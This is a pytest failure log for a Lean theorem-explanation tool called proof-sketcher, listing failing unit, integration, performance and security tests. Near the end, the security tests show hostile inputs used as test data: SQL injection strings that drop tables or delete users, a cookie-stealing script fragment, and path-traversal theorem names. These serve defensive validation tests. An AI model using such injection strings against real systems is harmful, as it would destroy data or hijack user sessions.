E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   proof_strategy
E     Field required [type=missing, input_value={'theorem_name': 'theorem...fficulty_level': 'easy'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   difficulty_level
E     Value error, Difficulty must be one of ['beginner', 'intermediate', 'advanced'] [type=value_error, input_value='easy', input_type=str]
E       For further information visit https://errors.pydantic.dev/2.11/v/value_error
__________ TestMarkdownExporter.test_mathlib_exporter_initialization ___________
tests/unit/test_exporters.py:402: in test_mathlib_exporter_initialization
    assert exporter.notation_handler is not None
           ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'MarkdownExporter' object has no attribute 'notation_handler'
____________ TestMarkdownExporter.test_mathlib_notation_enhancement ____________
tests/unit/test_exporters.py:409: in test_mathlib_notation_enhancement
    exporter.notation_handler, "enhance_proof_sketch"
    ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'MarkdownExporter' object has no attribute 'notation_handler'
___________ TestMarkdownExporter.test_mathlib_complexity_assessment ____________
tests/unit/test_exporters.py:422: in test_mathlib_complexity_assessment
    complexity = exporter._assess_complexity(sample_proof_sketch)
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'MarkdownExporter' object has no attribute '_assess_complexity'
_______________ TestMarkdownExporter.test_mathlib_export_single ________________
tests/unit/test_exporters.py:433: in test_mathlib_export_single
    with patch.object(exporter, "_enhance_with_mathlib_notation") as mock_enhance:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1467: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1437: in get_original
    raise AttributeError(
E   AttributeError: <proof_sketcher.exporter.markdown.MarkdownExporter object at 0x1046741d0> does not have the attribute '_enhance_with_mathlib_notation'
____________ TestBaseExporter.test_jupyter_exporter_initialization _____________
tests/unit/test_exporters.py:349: in test_jupyter_exporter_initialization
    exporter = BaseExporter(options)
               ^^^^^^^^^^^^^^^^^^^^^
E   TypeError: Can't instantiate abstract class BaseExporter without an implementation for abstract methods 'export_multiple', 'export_single', 'format'
_________________ TestBaseExporter.test_jupyter_export_single __________________
tests/unit/test_exporters.py:357: in test_jupyter_export_single
    exporter = BaseExporter(options)
               ^^^^^^^^^^^^^^^^^^^^^
E   TypeError: Can't instantiate abstract class BaseExporter without an implementation for abstract methods 'export_multiple', 'export_single', 'format'
_______________ TestBaseExporter.test_jupyter_notebook_structure _______________
tests/unit/test_exporters.py:371: in test_jupyter_notebook_structure
    exporter = BaseExporter(options)
               ^^^^^^^^^^^^^^^^^^^^^
E   TypeError: Can't instantiate abstract class BaseExporter without an implementation for abstract methods 'export_multiple', 'export_single', 'format'
________________ TestBaseExporter.test_jupyter_with_code_cells _________________
tests/unit/test_exporters.py:387: in test_jupyter_with_code_cells
    exporter = BaseExporter(options)
               ^^^^^^^^^^^^^^^^^^^^^
E   TypeError: Can't instantiate abstract class BaseExporter without an implementation for abstract methods 'export_multiple', 'export_single', 'format'
___________ TestTemplateManager.test_template_manager_initialization ___________
tests/unit/test_exporters.py:456: in test_template_manager_initialization
    manager = TemplateContext()
              ^^^^^^^^^^^^^^^
E   NameError: name 'TemplateContext' is not defined
________________ TestTemplateManager.test_render_html_template _________________
tests/unit/test_exporters.py:462: in test_render_html_template
    manager = TemplateContext()
              ^^^^^^^^^^^^^^^
E   NameError: name 'TemplateContext' is not defined
______________ TestTemplateManager.test_render_markdown_template _______________
tests/unit/test_exporters.py:478: in test_render_markdown_template
    manager = TemplateContext()
              ^^^^^^^^^^^^^^^
E   NameError: name 'TemplateContext' is not defined
______________ TestTemplateManager.test_template_context_helpers _______________
tests/unit/test_exporters.py:493: in test_template_context_helpers
    manager = TemplateContext()
              ^^^^^^^^^^^^^^^
E   NameError: name 'TemplateContext' is not defined
_______________ TestTemplateManager.test_custom_template_filters _______________
tests/unit/test_exporters.py:502: in test_custom_template_filters
    manager = TemplateContext()
              ^^^^^^^^^^^^^^^
E   NameError: name 'TemplateContext' is not defined
_____________ TestTemplateManager.test_template_not_found_handling _____________
tests/unit/test_exporters.py:511: in test_template_not_found_handling
    manager = TemplateContext()
              ^^^^^^^^^^^^^^^
E   NameError: name 'TemplateContext' is not defined
________________ TestTemplateManager.test_template_inheritance _________________
tests/unit/test_exporters.py:518: in test_template_inheritance
    manager = TemplateContext()
              ^^^^^^^^^^^^^^^
E   NameError: name 'TemplateContext' is not defined
_________________ TestSimpleLeanParser.test_parse_simple_file __________________
tests/unit/test_parsers.py:84: in test_parse_simple_file
    parser = SimpleLeanParser(config=parser_config)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: SimpleLeanParser() takes no arguments
_______________ TestSimpleLeanParser.test_parse_file_with_errors _______________
tests/unit/test_parsers.py:116: in test_parse_file_with_errors
    parser = SimpleLeanParser(config=parser_config)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: SimpleLeanParser() takes no arguments
__________________ TestSimpleLeanParser.test_parse_directory ___________________
tests/unit/test_parsers.py:134: in test_parse_directory
    parser = SimpleLeanParser(config=parser_config)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: SimpleLeanParser() takes no arguments
_______________ TestSimpleLeanParser.test_dependency_extraction ________________
tests/unit/test_parsers.py:152: in test_dependency_extraction
    parser = SimpleLeanParser(config=parser_config)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: SimpleLeanParser() takes no arguments
_________________ TestSimpleLeanParser.test_tactic_extraction __________________
tests/unit/test_parsers.py:161: in test_tactic_extraction
    parser = SimpleLeanParser(config=parser_config)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: SimpleLeanParser() takes no arguments
_________________ TestSimpleLeanParser.test_namespace_handling _________________
tests/unit/test_parsers.py:172: in test_namespace_handling
    parser = SimpleLeanParser(config=parser_config)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: SimpleLeanParser() takes no arguments
___________________ TestSimpleLeanParser.test_error_recovery ___________________
tests/unit/test_parsers.py:193: in test_error_recovery
    parser = SimpleLeanParser(config=parser_config)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: SimpleLeanParser() takes no arguments
_______________ TestLeanExtractor.test_extractor_initialization ________________
tests/unit/test_parsers.py:325: in test_extractor_initialization
    assert extractor.lean_executable is not None
           ^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'SimpleLeanParser' object has no attribute 'lean_executable'
__________________ TestLeanExtractor.test_extract_file_basic ___________________
tests/unit/test_parsers.py:334: in test_extract_file_basic
    with patch.object(extractor, "_run_lean_command") as mock_run:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1467: in __enter__
    original, local = self.get_original()
                      ^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/unittest/mock.py:1437: in get_original
    raise AttributeError(
E   AttributeError: <proof_sketcher.parser.simple_parser.SimpleLeanParser object at 0x104767680> does not have the attribute '_run_lean_command'
________________ TestLeanExtractor.test_lean_command_execution _________________
tests/unit/test_parsers.py:361: in test_lean_command_execution
    result = extractor._run_lean_command("--help")
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'SimpleLeanParser' object has no attribute '_run_lean_command'
__________________ TestLeanExtractor.test_theorem_validation ___________________
tests/unit/test_parsers.py:373: in test_theorem_validation
    theorem = extractor._validate_theorem(valid_data)
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'SimpleLeanParser' object has no attribute '_validate_theorem'
____________________ TestLeanExtractor.test_error_handling _____________________
tests/unit/test_parsers.py:389: in test_error_handling
    extractor.extract_file(tmp_path / "nonexistent.lean")
    ^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'SimpleLeanParser' object has no attribute 'extract_file'
____________________ TestParserConfig.test_config_creation _____________________
tests/unit/test_parsers.py:494: in test_config_creation
    config = ParserConfig(
E   TypeError: ParserConfig.__init__() got an unexpected keyword argument 'timeout_seconds'
___________________ TestParserConfig.test_config_validation ____________________
tests/unit/test_parsers.py:505: in test_config_validation
    config = ParserConfig(timeout_seconds=30)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: ParserConfig.__init__() got an unexpected keyword argument 'timeout_seconds'
__________________ TestParserConfig.test_config_serialization __________________
tests/unit/test_parsers.py:514: in test_config_serialization
    config = ParserConfig(
E   TypeError: ParserConfig.__init__() got an unexpected keyword argument 'timeout_seconds'
_____________________ TestParserConfig.test_config_loading _____________________
tests/unit/test_parsers.py:534: in test_config_loading
    config = ParserConfig.from_file(config_file)
             ^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'ParserConfig' has no attribute 'from_file'
=============================== warnings summary ===============================
tests/integration/test_mvp_pipeline.py::test_minimal_pipeline
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/integration/test_mvp_pipeline.py::test_minimal_pipeline returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/manual_tests/test_critical_error_handling.py::test_error_accumulation
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/manual_tests/test_critical_error_handling.py::test_error_accumulation returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/manual_tests/test_critical_error_handling.py::test_structured_logging
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/manual_tests/test_critical_error_handling.py::test_structured_logging returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/manual_tests/test_critical_error_handling.py::test_batch_error_recovery
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/manual_tests/test_critical_error_handling.py::test_batch_error_recovery returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/manual_tests/test_real_batch_errors.py::test_batch_export_with_failures
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/manual_tests/test_real_batch_errors.py::test_batch_export_with_failures returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/unit/test_lsp_integration.py::test_backward_compatibility
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/unit/test_lsp_integration.py::test_backward_compatibility returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/unit/test_lsp_integration.py::test_educational_enhancement
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/unit/test_lsp_integration.py::test_educational_enhancement returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/unit/test_mathlib_integration.py::test_mathlib_theorem_parsing
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/unit/test_mathlib_integration.py::test_mathlib_theorem_parsing returned <class 'tuple'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/unit/test_mathlib_integration.py::test_performance_scalability
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/unit/test_mathlib_integration.py::test_performance_scalability returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/unit/test_mathlib_integration.py::test_advanced_mathematical_features
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/unit/test_mathlib_integration.py::test_advanced_mathematical_features returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/unit/test_progressive_generator.py::test_progressive_explanation_generation
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/unit/test_progressive_generator.py::test_progressive_explanation_generation returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/unit/test_progressive_generator.py::test_learning_pathway_creation
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/unit/test_progressive_generator.py::test_learning_pathway_creation returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/unit/test_progressive_generator.py::test_concept_extraction
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/unit/test_progressive_generator.py::test_concept_extraction returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/unit/test_progressive_generator.py::test_educational_adaptation
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/unit/test_progressive_generator.py::test_educational_adaptation returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/unit/test_progressive_generator.py::test_interactive_elements
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/unit/test_progressive_generator.py::test_interactive_elements returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/unit/test_progressive_generator.py::test_comprehensive_integration
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/unit/test_progressive_generator.py::test_comprehensive_integration returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/unit/test_semantic_generator.py::test_semantic_generator_levels
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/unit/test_semantic_generator.py::test_semantic_generator_levels returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/unit/test_semantic_generator.py::test_progressive_explanations
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/unit/test_semantic_generator.py::test_progressive_explanations returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/unit/test_semantic_generator.py::test_mathematical_entity_recognition
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/unit/test_semantic_generator.py::test_mathematical_entity_recognition returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/unit/test_semantic_generator.py::test_tactic_aware_explanations
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/unit/test_semantic_generator.py::test_tactic_aware_explanations returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

tests/unit/test_semantic_generator.py::test_backward_compatibility
  /Users/brightliu/miniconda3/envs/cs109b/lib/python3.12/site-packages/_pytest/python.py:161: PytestReturnNotNoneWarning: Test functions should return None, but tests/unit/test_semantic_generator.py::test_backward_compatibility returned <class 'bool'>.
  Did you mean to use `assert` instead of `return`?
  See https://docs.pytest.org/en/stable/how-to/assert.html#return-not-none for more information.
    warnings.warn(

-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
=========================== short test summary info ============================
FAILED tests/integration/test_end_to_end.py::TestSimpleTheoremPipeline::test_simple_theorem_full_pipeline - assert 2 == 0
 +  where 2 = <Result SystemExit(2)>.exit_code
FAILED tests/integration/test_end_to_end.py::TestSimpleTheoremPipeline::test_offline_mode_pipeline - assert 2 == 0
 +  where 2 = <Result SystemExit(2)>.exit_code
FAILED tests/integration/test_end_to_end.py::TestMathlibTheoremPipeline::test_mathlib_theorem_pipeline - AttributeError: module 'proof_sketcher.generator' has no attribute 'claude'
FAILED tests/integration/test_end_to_end.py::TestBatchProcessing::test_batch_processing - assert 2 == 0
 +  where 2 = <Result SystemExit(2)>.exit_code
FAILED tests/integration/test_end_to_end.py::TestErrorRecovery::test_error_recovery - assert 2 == 0
 +  where 2 = <Result SystemExit(2)>.exit_code
FAILED tests/integration/test_end_to_end.py::TestErrorRecovery::test_timeout_handling - ModuleNotFoundError: No module named 'proof_sketcher.generator.claude'
FAILED tests/integration/test_end_to_end.py::TestErrorRecovery::test_memory_limit_handling - ModuleNotFoundError: No module named 'proof_sketcher.core.resources'
FAILED tests/integration/test_end_to_end.py::TestPerformanceBenchmarks::test_single_theorem_performance - assert 2 == 0
 +  where 2 = <Result SystemExit(2)>.exit_code
FAILED tests/integration/test_end_to_end.py::TestPerformanceBenchmarks::test_batch_performance - assert 2 == 0
 +  where 2 = <Result SystemExit(2)>.exit_code
FAILED tests/integration/test_end_to_end.py::TestPerformanceBenchmarks::test_cache_effectiveness - assert 2 == 0
 +  where 2 = <Result SystemExit(2)>.exit_code
FAILED tests/integration/test_full_pipeline.py::TestFullPipeline::test_batch_processing_pipeline - AttributeError: module 'proof_sketcher' has no attribute 'batch'
FAILED tests/integration/test_full_pipeline.py::TestFullPipeline::test_error_handling_pipeline - AttributeError: module 'proof_sketcher.parser' has no attribute 'lean_parser'. Did you mean: 'LeanParser'?
FAILED tests/integration/test_full_pipeline.py::TestFullPipeline::test_configuration_pipeline - pydantic_core._pydantic_core.ValidationError: 1 validation error for GenerationConfig
model
  Input should be 'claude-3-5-sonnet-20241022', 'claude-3-5-haiku-20241022' or 'claude-3-opus-20240229' [type=enum, input_value='claude-3', input_type=str]
    For further information visit https://errors.pydantic.dev/2.11/v/enum
FAILED tests/integration/test_full_pipeline.py::TestCLIIntegration::test_cli_prove_command - AttributeError: module 'proof_sketcher.parser' has no attribute 'lean_parser'. Did you mean: 'LeanParser'?
FAILED tests/integration/test_full_pipeline.py::TestCLIIntegration::test_cli_batch_command - AttributeError: module 'proof_sketcher' has no attribute 'batch'
FAILED tests/integration/test_full_pipeline.py::TestCacheIntegration::test_generation_cache_integration - ModuleNotFoundError: No module named 'proof_sketcher.generator.cache'
FAILED tests/integration/test_full_pipeline.py::TestCacheIntegration::test_export_cache_integration - ImportError: cannot import name 'BaseExporterBase' from 'proof_sketcher.exporter.models' (/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/exporter/models.py)
FAILED tests/integration/test_full_pipeline.py::TestResourceManagement::test_memory_limits_pipeline - ModuleNotFoundError: No module named 'proof_sketcher.core.resources'
FAILED tests/integration/test_full_pipeline.py::TestResourceManagement::test_temp_file_cleanup - ModuleNotFoundError: No module named 'proof_sketcher.core.resources'
FAILED tests/integration/test_full_pipeline.py::TestPerformanceIntegration::test_parallel_processing_performance - ModuleNotFoundError: No module named 'proof_sketcher.exporter.batch_processor.parallel_processor'; 'proof_sketcher.exporter.batch_processor' is not a package
FAILED tests/integration/test_full_pipeline.py::TestPerformanceIntegration::test_notation_optimization_performance - ModuleNotFoundError: No module named 'proof_sketcher.parser.models_optimized'
FAILED tests/integration/test_full_pipeline.py::TestMathlibIntegration::test_mathlib_notation_handling - ImportError: cannot import name 'ParserConfig' from 'proof_sketcher.parser.models' (/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/parser/models.py)
FAILED tests/integration/test_mathlib_real.py::TestParserConfig::test_basic_notation_conversion - AttributeError: 'ParserConfig' object has no attribute 'convert_to_latex'
FAILED tests/integration/test_mathlib_real.py::TestParserConfig::test_complex_notation - AttributeError: 'ParserConfig' object has no attribute 'convert_to_latex'
FAILED tests/integration/test_mathlib_real.py::TestParserConfig::test_notation_table_generation - AttributeError: 'ParserConfig' object has no attribute 'get_notation_table'
FAILED tests/integration/test_mathlib_real.py::TestParserConfig::test_mathematical_area_detection - AttributeError: 'ParserConfig' object has no attribute 'detect_mathematical_areas'
FAILED tests/integration/test_mathlib_real.py::TestMathlibIntegration::test_mathlib_style_project_scanning - AttributeError: 'BatchExporter' object has no attribute 'scan_project'
FAILED tests/integration/test_mathlib_real.py::TestMathlibIntegration::test_end_to_end_mathlib_processing - assert 0 > 0
 +  where 0 = len([])
FAILED tests/integration/test_mathlib_real.py::TestMathlibIntegration::test_mathlib_batch_processing - ImportError: cannot import name 'ParallelProcessor' from 'proof_sketcher.exporter.batch_processor' (/Users/brightliu/Coding_Projects/proof-sketcher/src/proof_sketcher/exporter/batch_processor.py)
FAILED tests/integration/test_mathlib_real.py::TestMathlibPerformance::test_notation_handler_performance - AttributeError: 'ParserConfig' object has no attribute 'convert_to_latex'
FAILED tests/integration/test_mathlib_real.py::TestMathlibPerformance::test_exporter_performance - pydantic_core._pydantic_core.ValidationError: 10 validation errors for ProofSketch
theorem_statement
  Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
intuitive_overview
  Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_overview
  Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_overview
  Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_overview
  Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
intuitive_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
conceptual_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
bridging_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
formal_conclusion
  Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
proof_strategy
  Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
FAILED tests/manual_tests/test_critical_error_handling.py::test_resource_limits - TypeError: 'float' object cannot be interpreted as an integer
FAILED tests/manual_tests/test_critical_error_handling.py::test_error_context_propagation - AssertionError: assert 'initializing system' in 'Unexpected error during loading configuration: Configuration file missing'
 +  where 'Unexpected error during loading configuration: Configuration file missing' = str(ProofSketcherError('Unexpected error during loading configuration: Configuration file missing'))
FAILED tests/manual_tests/test_critical_error_handling.py::test_file_parser_error_handling - AssertionError: assert 'Not a Lean file' in 'File not found: test.txt'
 +  where 'File not found: test.txt' = ParseError(message='File not found: test.txt', line_number=None, column=None, error_type='file_not_found', severity='error').message
FAILED tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_parse_real_theorem[theorem_data0] - AssertionError: Statement 'a + b = b + a' should contain 'Nat'
assert 'nat' in 'a + b = b + a'
 +  where 'nat' = <built-in method lower of str object at 0x102eb15f0>()
 +    where <built-in method lower of str object at 0x102eb15f0> = 'Nat'.lower
FAILED tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_parse_real_theorem[theorem_data1] - AssertionError: Statement 'a * (b + c) = a * b + a * c' should contain 'Nat'
assert 'nat' in 'a * (b + c) = a * b + a * c'
 +  where 'nat' = <built-in method lower of str object at 0x102eb15f0>()
 +    where <built-in method lower of str object at 0x102eb15f0> = 'Nat'.lower
FAILED tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_parse_real_theorem[theorem_data2] - AssertionError: Statement '0 + n = n' should contain 'Nat'
assert 'nat' in '0 + n = n'
 +  where 'nat' = <built-in method lower of str object at 0x102eb15f0>()
 +    where <built-in method lower of str object at 0x102eb15f0> = 'Nat'.lower
FAILED tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_parse_real_theorem[theorem_data3] - AssertionError: Statement '(n + 1) + m = n + (m + 1)' should contain 'Nat'
assert 'nat' in '(n + 1) + m = n + (m + 1)'
 +  where 'nat' = <built-in method lower of str object at 0x102eb15f0>()
 +    where <built-in method lower of str object at 0x102eb15f0> = 'Nat'.lower
FAILED tests/parser/test_real_theorems.py::TestRealTheoremParsing::test_parse_real_theorem[theorem_data4] - AssertionError: Statement '(a + b) + c = a + (b + c)' should contain 'Nat'
assert 'nat' in '(a + b) + c = a + (b + c)'
 +  where 'nat' = <built-in method lower of str object at 0x102eb15f0>()
 +    where <built-in method lower of str object at 0x102eb15f0> = 'Nat'.lower
FAILED tests/parser/test_real_theorems.py::TestParserDiagnostics::test_basic_parsing_fallback - AttributeError: 'SimpleLeanParser' object has no attribute 'config'
FAILED tests/performance/test_benchmarks.py::test_performance_improvements - AssertionError: Overall performance score 0.0/100 (target: 70+)
assert 0 > 70.0
FAILED tests/performance/test_benchmarks.py::test_caching_effectiveness - AttributeError: 'ProofSketcherConfig' object has no attribute 'set'
FAILED tests/performance/test_benchmarks.py::test_resource_limits_functionality - AttributeError: 'ProofSketcherConfig' object has no attribute 'limit_memory'
FAILED tests/security/test_exploit_attempts.py::TestTheoremNameExploits::test_path_injection_in_theorem_name - AssertionError: assert '..' not in 'theorem_.._.._.._secret'

  '..' is contained here:
    theorem_.._.._.._secret
  ?         ++
FAILED tests/security/test_exploit_attempts.py::TestResourceExhaustionExploits::test_rate_limiting - RuntimeError: There is no current event loop in thread 'MainThread'.
FAILED tests/security/test_exploit_attempts.py::TestXSSPrevention::test_script_injection_in_content - pydantic_core._pydantic_core.ValidationError: 2 validation errors for ProofStep
step_number
  Field required [type=missing, input_value={'description': "<svg onl...al_cookies()</script>']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
mathematical_content
  Field required [type=missing, input_value={'description': "<svg onl...al_cookies()</script>']}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.11/v/missing
FAILED tests/security/test_exploit_attempts.py::TestEdgeCaseExploits::test_special_filesystem_names - AssertionError: assert ('CON' != 'CON' or 'CON' in ['.', '..'])
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization['; DROP TABLE theorems; ---'; DROP TABLE theorems; --] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[admin' OR '1'='1-admin' OR '1'='1] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
FAILED tests/security/test_input_validation.py::TestInputValidation::test_html_sanitization[1; DELETE FROM users-1; DELETE FROM users] - AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
